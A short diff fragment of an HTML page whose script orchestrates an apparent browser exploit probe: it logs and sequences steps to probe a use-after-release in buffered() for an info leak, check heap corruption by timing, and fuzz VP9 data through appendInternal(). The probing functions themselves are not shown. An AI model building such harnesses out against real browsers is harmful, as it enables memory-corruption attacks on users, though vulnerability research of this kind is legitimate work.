+  inf('[*] Step 1: Probe buffered() UAR for info leak');
+  inf('[*] Step 2: Confirm heap corruption via timing delta');
+  inf('[*] Step 3: Fuzz all VP9 vectors through appendInternal()');
+  sep();
+
+  probeUAR();
+  setTimeout(function(){
+    sep(); probeUARHeap();
+    setTimeout(function(){
+      sep(); fuzzVP9All();
+    }, 3000);
+  }, 3000);
+}
 </script>
 </body>
 </html>
